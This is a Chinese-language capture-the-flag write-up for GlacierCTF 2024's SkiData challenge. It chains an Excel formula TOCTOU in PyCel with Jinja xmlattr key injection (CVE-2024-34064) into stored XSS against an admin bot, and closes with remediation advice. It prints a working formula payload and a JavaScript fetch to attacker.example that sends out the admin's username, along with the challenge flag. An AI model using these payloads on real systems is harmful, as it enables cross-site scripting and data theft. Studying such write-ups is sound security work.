# GlacierCTF 2024 SkiData

## 题目简述

SkiData 允许用户上传包含比赛排名的 `.xlsx`，服务器用 PyCel 计算公式后把结果存进数据库。用户可将自己的比赛报告给管理员，Playwright bot 会以管理员账号访问比赛详情页；管理员用户名本身就是 flag。

利用由两个时间点问题组成：服务器先验证 C 列 Rank 的计算结果是整数，随后把 E 列改为字符串 `Imported`，再重新计算 C 列。恶意公式可在第一次返回整数、第二次返回 XSS payload。模板又把 rank 拼进 `style()` 字典的“键”，交给 Jinja 3.1.3 的 `xmlattr`，触发 CVE-2024-34064 HTML 属性注入。最终在管理员页面执行 JavaScript并外带其用户名。

## 解题过程

### 1. 找到公式的 TOCTOU

每行的导入顺序为：

```python
if type(excel.evaluate(f"Sheet1!C{row}")) is not int:
    return error("Rank must be an integer")

excel.evaluate(f"Sheet1!E{row}")
excel.set_value(f"Sheet1!E{row}", "Imported")

rank = excel.evaluate(f"Sheet1!C{row}")
```

Rank 在校验后重新求值，期间 E 列状态发生变化。令 `C2` 为：

```excel
=IF(ISBLANK(E2),1,"/onerror=fetch('https://attacker.example/?u='+document.getElementsByTagName('li')[0].attributes.value.nodeValue)/")
```

上传时 E2 为空，第一次计算结果是整数 `1`，类型检查通过；`set_value(E2,"Imported")` 后，第二次结果变成以 `/onerror=.../` 包围的字符串并被写进 `RaceResult.rank`。

已逐单元格检查仓库中的官方 `expl.xlsx`：工作簿只有 `Sheet1`，共 11 行、A–D 四列，没有外部工作簿链接或定义名称；唯一恶意单元格就是 `C2` 的上述公式，其余九条数据行是正常比赛数据。漏洞不依赖宏、OLE 或外部数据连接。

### 2. 从 rank 值变成属性名注入

前三名的图标通过：

```python
def style(rank):
    return {
        f"rank-{rank}": "1",
        "src": f"/static/rank-{rank}.png",
        "width": "25px",
        "height": "25px",
    }
```

模板再渲染：

```html
<img {{ style(result.rank)|xmlattr }} alt="rank-img"/>
```

用户输入没有进入普通属性值，而是进入字典键。题目固定 `Jinja2==3.1.3`；CVE-2024-34064 的根因正是旧版 `xmlattr` 没有拒绝键中的 `/`、`>`、`=` 等非属性名字符。恶意 key 令原本的一项字典属性被浏览器解析成新的 `onerror` 事件属性。该漏洞在 Jinja 3.1.4 修复，Pallets 的 [官方安全公告](https://github.com/pallets/jinja/security/advisories/GHSA-h75v-3vvj-5mfj) 还特别指出：无论版本如何，应用都不应把用户输入作为 `xmlattr` 的键。

### 3. 让管理员 bot 触发并外带 flag

完成注册、登录和上传后，请求：

```text
GET /race/<race_id>/report
```

服务端把任务放入 Redis 队列。bot 使用环境变量中的管理员用户名和密码登录，再访问 `/race/<race_id>` 并停留 4 秒。导航栏保存：

```html
<li class="nav-item" value="{{ current_user.username }}">
```

因此 XSS 可读取第一个 `li` 的 `value` 并向攻击者服务器发送请求：

```javascript
fetch("https://attacker.example/?u=" +
  document.getElementsByTagName("li")[0].attributes.value.nodeValue)
```

错误的奖牌 `src` 会触发 `onerror`，请求查询参数中出现管理员用户名：

```text
gctf{ex3c3lsi0r_l4zy_m4st3r}
```

题目 CSP 允许 `'unsafe-inline'`，所以内联事件处理器能够运行；`script-src` 中存在该项使这一防护无法阻止 payload。

## 方法总结

完整利用是“公式依赖 E 列 → 校验时为整数 → 服务端写 E 列后变成 payload → 用户值进入 `xmlattr` 的 key → 属性注入 XSS → admin bot 访问 → 从导航栏外带用户名 flag”。修复应在所有状态更新后只计算一次并保存不可变的 Rank，数据库层坚持整数类型，`style()` 只返回固定属性名、把用户输入限制为合法排名值，同时升级 Jinja 至已修复版本并移除 CSP 的 `'unsafe-inline'`。
